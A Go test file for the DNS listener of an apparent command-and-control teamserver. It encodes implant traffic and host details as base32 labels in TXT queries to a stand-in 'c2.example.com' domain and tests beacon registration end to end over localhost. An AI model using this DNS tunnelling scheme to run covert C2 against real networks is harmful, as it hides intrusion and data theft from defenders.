package beacon

import (
	"bytes"
	"encoding/base32"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"testing"
	"time"

	"cleat/teamserver/internal/crypto"
	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/session"
	"cleat/teamserver/internal/store"
)

// ===== Agent 侧线格式的复刻(互操作性断言用; 与 DnsWireCodec.cpp 逐行对应) =====

// agentQname 复刻 Agent 侧 dns::BuildQname:
//
//	meta = `<sid:08x>[-<seq:04x>-<idx>-<total>]`, 分片解 <meta>.<base32(分片负载)按 63 字符分标签>.<domain>
func agentQname(frag []byte, domain string, sid uint64) string {
	meta := fmt.Sprintf("%08x", sid)
	if len(frag) > 0 {
		seq := binary.LittleEndian.Uint16(frag[1:3])
		meta = fmt.Sprintf("%08x-%04x-%d-%d", sid, seq, frag[3], frag[4])
	}
	q := meta
	if len(frag) > 0 {
		// RFC4648 无 padding; Agent 输出小写
		b32 := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).
			EncodeToString(frag[datagramHeaderSize:]))
		for i := 0; i < len(b32); i += 63 {
			end := i + 63
			if end > len(b32) {
				end = len(b32)
			}
			q += "." + b32[i:end]
		}
	}
	return q + "." + domain
}

// agentQuery 复刻 Agent 侧 dns::BuildQuery: 12B 头 + qname + qtype=TXT + qclass=IN。
func agentQuery(id uint16, qname string) []byte {
	out := []byte{byte(id >> 8), byte(id), 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	for _, label := range strings.Split(qname, ".") {
		out = append(out, byte(len(label)))
		out = append(out, label...)
	}
	return append(out, 0x00, 0x00, 0x10, 0x00, 0x01)
}

// agentParseTxtResponse 复刻 Agent 侧 dns::ParseTxtResponse 的解析路径,
// 用于验证服务端构造的应答确实能被 Agent 读懂(字段布局/校验条件一致)。
func agentParseTxtResponse(resp, query []byte) ([]byte, bool) {
	if len(resp) < 12 || resp[0] != query[0] || resp[1] != query[1] {
		return nil, false
	}
	if resp[2]&0x80 == 0 || resp[3]&0x0F != 0 {
		return nil, false
	}
	ancount := int(resp[6])<<8 | int(resp[7])
	off, err := skipDNSName(resp, 12)
	if err != nil || off+4 > len(resp) {
		return nil, false
	}
	off += 4 // qtype + qclass
	var txt []byte
	for i := 0; i < ancount; i++ {
		if off >= len(resp) {
			return nil, false
		}
		if off, err = skipDNSName(resp, off); err != nil || off+10 > len(resp) {
			return nil, false
		}
		typ := int(resp[off])<<8 | int(resp[off+1])
		rdlen := int(resp[off+8])<<8 | int(resp[off+9])
		off += 10
		if off+rdlen > len(resp) {
			return nil, false
		}
		if typ == dnsQTXT { // TXT: [1B 段长][数据] 多段
			for pos, end := off, off+rdlen; pos < end; {
				segLen := int(resp[pos])
				pos++
				if pos+segLen > end {
					return nil, false
				}
				txt = append(txt, resp[pos:pos+segLen]...)
				pos += segLen
			}
		}
		off += rdlen
	}
	return txt, true
}

// TestParseQnameMetaProbe 无分片 qname(探活/空闲轮询)只带会话 id。
func TestParseQnameMetaProbe(t *testing.T) {
	sid, chunk, ok := parseQnameMeta("00001234")
	if !ok || sid != 0x1234 || chunk != nil {
		t.Fatalf("探活 qname 解析错误: sid=%#x chunk=%v ok=%v", sid, chunk, ok)
	}
}

// TestParseQnameMetaFragment 分片 qname 能被还原成原始分片(与 Agent 编码互逆)。
func TestParseQnameMetaFragment(t *testing.T) {
	payload := bytes.Repeat([]byte{0xA5}, 300) // 3 片
	frags := fragment(payload, 110, 0x1f)
	for i, frag := range frags {
		body := strings.TrimSuffix(agentQname(frag, "c2.example.com", 0x1234), ".c2.example.com")
		sid, got, ok := parseQnameMeta(body)
		if !ok {
			t.Fatalf("片%d 解析失败: %q", i, body)
		}
		if sid != 0x1234 {
			t.Fatalf("片%d 会话 id 应为 0x1234, got %#x", i, sid)
		}
		if !bytes.Equal(got, frag) {
			t.Fatalf("片%d 还原结果与原分片不一致\n got=%v\nwant=%v", i, got, frag)
		}
	}
}

// TestParseQnameMetaRejectsMalformed 畸形 qname 一律拒绝(不 panic)。
func TestParseQnameMetaRejectsMalformed(t *testing.T) {
	for _, bad := range []string{
		"",                       // 空
		"zzzz",                   // 非 hex 会话 id
		"00001234-1-2",           // 段数不足
		"00001234-0001-0-0",      // total=0
		"00001234-0001-5-3",      // idx >= total
		"00001234-0001-0-3",      // 声明分片却无 base32 标签
		"00001234-0001-0-3.!!!!", // 非法 base32
	} {
		if _, _, ok := parseQnameMeta(bad); ok {
			t.Errorf("畸形 qname 应被拒绝: %q", bad)
		}
	}
}

// TestBuildTXTReplyRoundTrip 服务端应答能被 Agent 侧解析路径读出原始分片;
// 空 rdata 回无答案应答(而非错误应答)。
func TestBuildTXTReplyRoundTrip(t *testing.T) {
	qname := agentQname(nil, "c2.example.com", 0x1234)
	query := agentQuery(0x0abc, qname)
	_, _, qEnd, err := parseDNSQuestion(query)
	if err != nil {
		t.Fatalf("解析自身构造的查询失败: %v", err)
	}

	rdata := []byte{datagramMagic, 0x01, 0x00, 0x02, 0x03, 0x04, 0x00, 0xde, 0xad}
	resp := buildTXTReply(query, qEnd, rdata)
	got, ok := agentParseTxtResponse(resp, query)
	if !ok || !bytes.Equal(got, rdata) {
		t.Fatalf("TXT 应答回读失败: got=%v ok=%v", got, ok)
	}

	// 无下行数据: AN=0, Agent 读到空 txt 且解析成功
	empty := buildTXTReply(query, qEnd, nil)
	got, ok = agentParseTxtResponse(empty, query)
	if !ok || len(got) != 0 {
		t.Fatalf("空应答应解析为空 txt: got=%v ok=%v", got, ok)
	}
}

// TestParseDNSQuestionCompressed 带压缩指针的域名可解析, 且大小写归一化。
func TestParseDNSQuestionCompressed(t *testing.T) {
	// 头部 12B + "C2.Example.COM" + 0 + qtype/qclass, 第二条 question 用 C00C 指针
	q := []byte{0x00, 0x01, 0x01, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	q = append(q, 2, 'C', '2', 7, 'E', 'x', 'a', 'm', 'p', 'l', 'e', 3, 'C', 'O', 'M', 0)
	q = append(q, 0x00, 0x10, 0x00, 0x01)
	q = append(q, 0xC0, 0x0C, 0x00, 0x10, 0x00, 0x01)

	name, qtype, qEnd, err := parseDNSQuestion(q)
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}
	if name != "c2.example.com" || qtype != dnsQTXT || qEnd != 12+16+4 {
		t.Fatalf("解析结果错误: name=%q qtype=%d qEnd=%d", name, qtype, qEnd)
	}
	for _, bad := range [][]byte{nil, make([]byte, 11), append(make([]byte, 12), 0x05, 'a')} {
		if _, _, _, err := parseDNSQuestion(bad); err == nil {
			t.Errorf("畸形报文应报错: %v", bad)
		}
	}
}

// TestDNSListenerEndToEnd 端到端: 模拟 Agent 走 DNS 分片上行 FirstConnect,
// 经真实 UDP listener 完成注册, 并从 TXT 应答分片重组出注册确认帧。
func TestDNSListenerEndToEnd(t *testing.T) {
	const domain = "c2.example.com"
	cbox, err := crypto.New(strings.Repeat("ab", 32))
	if err != nil {
		t.Fatalf("构造 PSK: %v", err)
	}
	mgr := session.NewManager(store.New(), eventbus.New(), cbox, nil, false)
	h := New(mgr, cbox, nil)
	l := NewDNSListener(h, domain)

	// 服务端与客户端用独立 socket: 共用同一个 socket 会让 Serve 循环与测试读端竞争收包
	srvConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)})
	if err != nil {
		t.Fatalf("监听 UDP: %v", err)
	}
	defer func() { _ = srvConn.Close() }()
	go func() { _ = l.Serve(srvConn) }()

	cliConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)})
	if err != nil {
		t.Fatalf("客户端 socket: %v", err)
	}
	defer func() { _ = cliConn.Close() }()
	srvAddr := srvConn.LocalAddr().(*net.UDPAddr)

	// Agent 侧: FirstConnect 明文 → 加密 → 分片 → 逐片以 TXT 查询上行
	plain, _ := json.Marshal(map[string]interface{}{
		"cmd":    session.CmdFirstConnect,
		"ts":     time.Now().Unix(),
		"params": map[string]interface{}{"machine_id": "dns-m1", "hostname": "dns-host"},
	})
	enc, err := cbox.Encrypt(plain)
	if err != nil {
		t.Fatalf("加密: %v", err)
	}
	upFrags := fragment(enc, 110, 1)
	if len(upFrags) < 2 {
		t.Fatalf("样本应跨多片以覆盖重组路径, got %d 片", len(upFrags))
	}

	recv := make([]byte, dnsRecvBufSize)
	downFrags := map[uint16][][]byte{}
	sendQuery := func(qid uint16, qname string) {
		t.Helper()
		if _, err := cliConn.WriteToUDP(agentQuery(qid, qname), srvAddr); err != nil {
			t.Fatalf("发送查询: %v", err)
		}
		_ = cliConn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, _, err := cliConn.ReadFromUDP(recv)
		if err != nil {
			t.Fatalf("接收应答: %v", err)
		}
		rdata, ok := agentParseTxtResponse(recv[:n], agentQuery(qid, qname))
		if !ok || len(rdata) == 0 {
			return
		}
		seq, _, _, ok := parseDatagramHeader(rdata)
		if !ok {
			t.Fatalf("下行分片头非法: %v", rdata)
		}
		downFrags[seq] = append(downFrags[seq], rdata)
	}

	qid := uint16(0x1000)
	for _, frag := range upFrags {
		body := strings.TrimSuffix(agentQname(frag, domain, 0), "."+domain)
		sendQuery(qid, body+"."+domain)
		qid++
	}
	// 上行已完整: 继续以探活查询拉取剩余下行分片(真实 Agent 亦按节流持续轮询)
	for i := 0; i < 10; i++ {
		sendQuery(qid, agentQname(nil, domain, 0))
		qid++
	}

	// 重组下行 → 解密 → 校验注册确认
	if len(downFrags) == 0 {
		t.Fatal("未收到任何下行分片(注册确认未回带)")
	}
	var frame []byte
	for _, frags := range downFrags {
		r := newReassembler()
		for _, f := range frags {
			if out, done := r.push(f); done {
				frame = out
				break
			}
		}
		if frame != nil {
			break
		}
	}
	if frame == nil {
		t.Fatalf("下行分片未收齐: %v", downFrags)
	}
	dec, err := cbox.Decrypt(frame)
	if err != nil {
		t.Fatalf("下行解密失败: %v", err)
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(dec, &resp); err != nil {
		t.Fatalf("确认帧解析失败: %v (%s)", err, dec)
	}
	sid, _ := resp["session_id"].(float64)
	if int(sid) == 0 {
		t.Fatalf("确认帧应含 session_id: %v", resp)
	}
	if _, ok := mgr.GetSessionInfo(int(sid)); !ok {
		t.Fatal("会话应已注册到 Manager")
	}
}

// TS-6: peers 上限 —— 伪造源地址灌对端表, 超限后静默丢弃(不再增长)。
func TestDNSPeersCap(t *testing.T) {
	const domain = "c2.example.com"
	cbox, err := crypto.New(strings.Repeat("ab", 32))
	if err != nil {
		t.Fatalf("构造 PSK: %v", err)
	}
	mgr := session.NewManager(store.New(), eventbus.New(), cbox, nil, false)
	l := NewDNSListener(New(mgr, cbox, nil), domain)

	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)})
	if err != nil {
		t.Fatalf("socket: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// 伪造 maxDNSPeers+50 个不同源地址的探活查询(不走 Serve, 不触发 gc)
	qid := uint16(0x3000)
	for i := 0; i < maxDNSPeers+50; i++ {
		raddr := &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1), Port: 40000 + i}
		qname := agentQname(nil, domain, 0)
		l.handleQuery(conn, agentQuery(qid, qname), raddr)
		qid++
	}

	l.mu.Lock()
	n := len(l.peers)
	l.mu.Unlock()
	if n > maxDNSPeers {
		t.Fatalf("peers = %d, 应被上限 %d 截住", n, maxDNSPeers)
	}
	if n != maxDNSPeers {
		t.Fatalf("peers = %d, 应恰为上限(前 maxDNSPeers 个创建, 其后静默丢弃)", n)
	}
}
